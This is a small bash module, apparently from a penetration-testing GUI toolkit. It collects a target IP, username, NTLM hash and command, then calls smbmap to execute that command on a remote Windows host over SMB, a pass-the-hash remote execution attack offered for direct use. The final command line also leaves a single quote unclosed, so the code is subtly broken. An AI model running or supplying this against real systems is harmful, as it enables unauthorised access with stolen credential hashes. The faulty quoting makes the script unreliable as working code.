#!/bin/bash

: '
smbmap: Execute command on smb as user with NTLM hash.
'
# Generate GUI form items (label, type (optional: default text), name, default (optional))
IP_FIELD=$(form_item  "IP address" "ip")
USERNAME_FIELD=$(form_item  "Username" "username" "Administrator")
HASH_FIELD=$(form_item  "hash" "hash")
CMD_FIELD=$(form_item  "cmd" "cmd" "whoami")

# Generate GUI form
generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}" "${CMD_FIELD}"

IP=${form_data["ip"]}
USERNAME=${form_data["username"]}
HASH=${form_data["hash"]}
CMD=${form_data["cmd"]}

execute_command "smbmap -H ${IP}  -u '${USERNAME}' -p '${HASH}' -x '${CMD}"
create_new_line
